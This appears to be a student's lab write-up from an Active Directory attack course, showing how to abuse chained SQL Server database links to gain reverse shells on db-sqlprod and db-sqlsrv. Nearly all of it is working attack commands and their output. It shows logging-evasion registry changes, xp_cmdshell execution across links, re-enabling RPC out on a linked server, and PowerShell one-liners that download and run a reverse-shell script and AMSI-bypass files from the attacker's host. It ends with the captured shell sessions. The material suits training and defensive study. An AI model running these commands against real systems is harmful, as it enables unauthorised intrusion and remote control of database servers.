# Hands-On 26:

```
Get a reverse shell on a db-sqlsrv in db.local forest by abusing database links from us-mssql.
```

## Index Of Content:

  1. [Abuse of database](#abuse-of-database)

## Abuse of database

Open new cmd console and launch invishell with module Powerup-SQL:

```
C:\Users\studentuser17>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Users\studentuser17>set COR_ENABLE_PROFILING=1

C:\Users\studentuser17>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\studentuser17>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\studentuser17>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\studentuser17>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Users\studentuser17>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\studentuser17> Import-Module C:\AD\Tools\PowerUp.ps1
PS C:\Users\studentuser17> Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1

```
Obtain SQL services across the domain:

```
PS C:\Users\studentuser17> Get-SQLInstanceDomain


ComputerName     : us-mssql.us.techcorp.local
Instance         : us-mssql.us.techcorp.local
DomainAccountSid : 150000052100019514814212226574150140238186983400
DomainAccount    : US-MSSQL$
DomainAccountCn  : US-MSSQL
Service          : MSSQLSvc
Spn              : MSSQLSvc/us-mssql.us.techcorp.local
LastLogon        : 3/4/2023 10:11 AM
Description      :
```
Extract info:

```
PS C:\Users\studentuser17> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : US-MSSQL
DomainName             : US
ServiceProcessID       : 3852
ServiceName            : MSSQLSERVER
ServiceAccount         : US\dbservice
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : US\studentuser17
IsSysadmin             : No
ActiveSessions         : 1
```

It's seems that the studentusers is allowed to login on the target Database:

```
ComputerName           : us-mssql.us.techcorp.local
Currentlogin           : US\studentuser17
```
And there are a valid link for connection:

```
PS C:\Users\studentuser17> Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : us-mssql.us.techcorp.local
DatabaseLinkId         : 0
DatabaseLinkName       : US-MSSQL
DatabaseLinkLocation   : Local
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : True
is_data_access_enabled : False
modify_date            : 7/7/2019 9:48:29 AM

ComputerName           : us-mssql.us.techcorp.local
Instance               : us-mssql.us.techcorp.local
DatabaseLinkId         : 1
DatabaseLinkName       : 192.168.23.25
DatabaseLinkLocation   : Remote
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : False
is_data_access_enabled : True
modify_date            : 7/9/2019 6:54:54 AM

```
Using HeidiSQL with user authenticate user credentials:
```
select * from openquery("192.168.23.25",'select * from master..sysservers')
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```

```
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
	Aug 22 2017 17:04:49 
	Copyright (C) 2017 Microsoft Corporation
	Developer Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

"0"	"1089"	"DB-SQLPROD"	"SQL Server"	"SQLOLEDB"	"DB-SQLPROD"	\N	\N	"2019-07-09 05:00:08.703"	"0"	"0"	\N	\N	"0"	"0"	"DB-SQLPROD                    "	"True"	"True"	"False"	"False"	"False"	"False"	"True"	"False"	"False"	"False"	"True"	"False"	\N	"False"
"1"	"1249"	"DB-SQLSRV"	"SQL Server"	"SQLOLEDB"	"DB-SQLSRV"	\N	\N	"2019-07-09 07:12:46.320"	"0"	"0"	\N	\N	"0"	"0"	"DB-SQLSRV                     "	"False"	"True"	"False"	"False"	"False"	"False"	"True"	"True"	"False"	"False"	"True"	"False"	\N	"False"

```

Link crawling verbose output:

```
PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
VERBOSE: us-mssql : Connection Success.
VERBOSE: us-mssql : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: US-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: US-MSSQL
VERBOSE:  - Link Login: US\studentuser17
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: 192.168.23.25
VERBOSE: us-mssql : Connection Success.
VERBOSE: us-mssql : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DB-SQLPROD
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: US-MSSQL -> 192.168.23.25
VERBOSE:  - Link Login: dbuser
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DB-SQLSRV
VERBOSE: us-mssql : Connection Success.
VERBOSE: us-mssql : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DB-SQLSRV
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: US-MSSQL -> 192.168.23.25 -> DB-SQLSRV
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser17
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :


```
Execute query with RCE using xp_cmshell on the MSSQL server:

```
PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser17
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery : {nt service\mssqlserver, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :


```
CustomQuery : {nt service\mssqlserver, }

So It's posiible spawn a reverse shell from the target machine:
1. Share with hfs Invoke-ReverseTcpEX modified with the student machine IP 192.168.100.17
2. Launch a new cmd with Invishell and powercat module loaded
3. Launch the following query to spawn a reverse shell to the previous powercat listener on local
```
PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c " iex(New-Object Net.webclient).DownloadString(\"http://192.168.100.17/Invoke-PowerShellTcpEx.ps1\");"'''

```
It's posible using the following query to bypass AMSI, but it's not mandatory on my lab:
```
PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c " iex (iwr -UseBasicParsing http://192.168.100.17/sbloggingbypass.txt); iex(iwr -UseBasicParsing http://192.168.100.17/amsibypass.txt); iex(New-Object Net.webclient).DownloadString(\"http://192.168.100.17/Invoke-PowerShellTcpEx.ps1\");"'''
```

The spawned reverse shell from database server:

```
PS C:\AD\Tools> powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.23.25] port  [tcp] accepted (source port 50973)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user MSSQLSERVER on DB-SQLPROD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt service\mssqlserver
PS C:\Windows\system32> hostname
DB-SQLProd
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::39f2:ca36:5e0a:472b%15
   IPv4 Address. . . . . . . . . . . : 192.168.23.25
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.23.254
PS C:\Windows\system32>
```
On the target machine the user sa is enable for execute commands:

```
PS C:\Windows\system32> Invoke-SqlCmd -Query "select * from master..sysservers"



srvid                : 0
srvstatus            : 1089
srvname              : DB-SQLPROD
srvproduct           : SQL Server
providername         : SQLOLEDB
datasource           : DB-SQLPROD
location             :
providerstring       :
schemadate           : 7/9/2019 5:00:08 AM
topologyx            : 0
topologyy            : 0
catalog              :
srvcollation         :
connecttimeout       : 0
querytimeout         : 0
srvnetname           : DB-SQLPROD
isremote             : True
rpc                  : True
pub                  : False
sub                  : False
dist                 : False
dpub                 : False
rpcout               : True
dataaccess           : False
collationcompatible  : False
system               : False
useremotecollation   : True
lazyschemavalidation : False
collation            :
nonsqlsub            : False

srvid                : 1
srvstatus            : 1249
srvname              : DB-SQLSRV
srvproduct           : SQL Server
providername         : SQLOLEDB
datasource           : DB-SQLSRV
location             :
providerstring       :
schemadate           : 7/9/2019 7:12:46 AM
topologyx            : 0
topologyy            : 0
catalog              :
srvcollation         :
connecttimeout       : 0
querytimeout         : 0
srvnetname           : DB-SQLSRV
isremote             : False
rpc                  : True
pub                  : False
sub                  : False
dist                 : False
dpub                 : False
rpcout               : True
dataaccess           : True
collationcompatible  : False
system               : False
useremotecollation   : True
lazyschemavalidation : False
collation            :
nonsqlsub            : False

```

It's possible configure rpc output on srvSQL:

```
PS C:\Windows\system32> Invoke-SqlCmd -Query "Query sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE ('sp_configure' 'show advanced options' ',1;reconfigure;') AT ""db-sqlsrv"""
```

On the previos cmd with PowerSQL it's possible validate the execution:

```
PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser17
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery : {nt service\mssqlserver, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery : {db\srvdba, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :

```

Using the same procedure for execute the previous reverse shell on the second specific targetlink db-sqlsrv:

```
PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c " iex(New-Object Net.webclient).DownloadString(\"http://192.168.100.17/Invoke-PowerShellTcpEx.ps1\");"''' -QueryTarget db-sqlsrv


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser17
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :



```


```
PS C:\AD\Tools> powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.23.36] port  [tcp] accepted (source port 51054)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user srvdba on DB-SQLSRV
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
db\srvdba
PS C:\Windows\system32> hostname
DB-SQLSrv
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7ba0:c1c9:7f6e:e9ad%2
   IPv4 Address. . . . . . . . . . . : 192.168.23.36
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.23.254
```
